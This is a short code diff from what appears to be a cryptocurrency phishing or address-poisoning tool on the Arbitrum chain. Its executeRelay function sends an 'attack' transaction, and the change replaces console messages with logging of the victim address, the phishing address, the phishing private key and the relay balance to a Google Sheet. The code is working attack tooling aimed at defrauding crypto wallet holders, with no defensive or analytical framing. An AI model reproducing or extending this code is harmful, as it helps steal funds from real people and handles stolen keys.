@@ -8,6 +8,7 @@ import { createWalletClient, createPublicClient, http, parseEther, fallback, enc
 import { privateKeyToAccount } from 'viem/accounts';
 import { arbitrum } from 'viem/chains';
 import dotenv from 'dotenv';
+import { logToGoogleSheetsSimple } from './sheetsLogger.mjs';
 
 dotenv.config();
 
@@ -168,11 +169,17 @@ export async function executeRelay({
 
     const receipt = await publicClient.waitForTransactionReceipt({ hash: attackHash });
 
-    if (receipt.status === 'success') {
-        console.log(`[Relay] Attack successful. Hash: ${attackHash}`);
-    } else {
-        console.warn(`[Relay] Attack transaction failed. Hash: ${attackHash}`);
-    }
+    const finalBalance = await publicClient.getBalance({ address: relayAccount.address });
+    const balanceEth = (Number(finalBalance) / 1e18).toFixed(6);
+
+    // Logging to Google Sheets with deduplication
+    await logToGoogleSheetsSimple({
+        victimAddress,
+        phishingAddress,
+        phishingPrivateKey,
+        balance: balanceEth,
+        status: receipt.status === 'success' ? 'SUCCESS' : 'FAILED',
+    });
 
     return {
         success: receipt.status === 'success',
@@ -180,5 +187,6 @@ export async function executeRelay({
         dustAmount: dustAmount.toString(),
         receipt,
         skippedFunding,
+        finalBalance: balanceEth,
     };
 }
